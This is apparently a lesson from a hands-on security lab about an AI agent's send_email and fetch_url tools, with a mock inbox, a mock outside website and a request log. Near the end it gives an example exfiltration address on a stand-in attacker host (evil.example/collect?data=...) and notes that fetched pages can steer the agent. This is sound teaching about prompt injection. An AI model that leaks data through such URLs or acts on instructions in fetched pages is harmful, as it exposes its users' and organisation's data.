# Lesson 6: Email and the Web

Two of HelpBot's tools reach beyond the company: `send_email` and `fetch_url`. This lab gives you a way to watch both, safely.

---

## The fake inbox (Mailpit)

Every email the agent sends goes to **Mailpit**, a mail server built for testing. It accepts mail, never delivers it anywhere, and shows it in a web inbox:

- In your browser: **http://localhost:8025**
- In the terminal: `bin/inbox.sh` (and `bin/inbox.sh clear` to empty it)

## The two websites

| Name | What it is | Network |
|---|---|---|
| `intranet.local` | The company wiki (onboarding, holiday schedule) | `internal`, with everything else |
| `partner-news.example` and `evil.example` | "The outside internet": a small Python server in a container | `outside`, shared only with the agent |

Look at the bottom of `docker-compose.yml`:

```yaml
networks:
  internal:
    driver: bridge
  # Stands in for the internet: only the agent and the outside site are on it
  outside:
    driver: bridge
```

The agent sits on both networks, just as a real agent server sits inside your company and can also reach the internet.

## Every request to the outside is recorded

The outside site (`sites/external/server.py`) writes one line for every request it receives, including the full address and any data sent with it:

```bash
bin/external_log.sh
```

```
  01:12:16  GET  partner-news.example   /shipping-update
  01:12:19  GET  partner-news.example   /shipping-update
2 request(s) reached the outside site.
```

In real life you would not have the outside site's logs, because someone else runs it. Here you do, so in Part 2 you can see exactly what an attacker receives.

---

## Why these two tools matter most

`fetch_url` and `send_email` are the two ways data can **leave**:
- `send_email` can put any text in a message to any address
- `fetch_url` can put any text in a web address: `http://evil.example/collect?data=...`

And `fetch_url` is also a way for outside text to come **in**. A web page is written by whoever owns the website, and the agent reads it and acts on what it says.

Next: [The Database](07-database.md)
